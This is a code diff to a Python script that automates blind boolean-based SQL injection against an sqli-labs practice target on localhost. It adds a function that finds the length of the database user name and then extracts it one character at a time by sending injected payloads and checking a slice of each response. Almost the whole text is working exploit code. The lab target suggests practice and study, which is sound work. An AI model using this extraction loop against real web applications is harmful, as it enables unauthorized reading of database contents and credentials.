@@ -27,7 +27,7 @@ def username_length(payload , validator):
             username_length = i
         else:
             response = False
-            i = i + 1;
+            i = i + 1
 
     return username_length
 
@@ -49,7 +49,7 @@ def username_length_finder(payload, validator):
             username_length = i
         else:
             response = False
-            i = i + 1;
+            i = i + 1
 
     return username_length
 
@@ -97,5 +97,47 @@ def database_name_finder(payload, validator):
 
     return database_name
 
+
+def username_finder(payload, validator):
+    i = 0
+    a = 32
+    ascii_max = 127
+    list_payload_1 = list(payload)
+    database_name_list = []
+    payload_username_length = "http://localhost/sqli-labs-php7-master/Less-8/?id=1' AND (select length(user())) = 0 --+"
+
+    username_length = username_length_finder(payload_username_length, validator)
+    print(username_length)
+
+    while (i < username_length):
+        i = i + 1
+        list_payload_2 = list_payload_1
+        list_payload_2[87] = str(i)
+
+        while (a < ascii_max):
+            if (a == 32):
+                list_payload_2[96] = str(a)
+                payload_1 = "".join(list_payload_2)
+
+                print(payload_1)
+                response_text_1 = get_requester(payload_1)
+                response_formatted_text_1 = text_formatter(response_text_1)
+            else:
+                print(payload_1)
+                response_text_1 = get_requester(payload_1)
+                response_formatted_text_1 = text_formatter(response_text_1)
+
+            if (validator == response_formatted_text_1[505:513]):
+                database_name_list.append(chr(a))
+                a = 32
+                break
+            else:
+                a = a + 1
+                list_payload_2[96] = str(a)
+                payload_1 = "".join(list_payload_2)
+
+    username = "".join(database_name_list)
+
+    return username
 
     
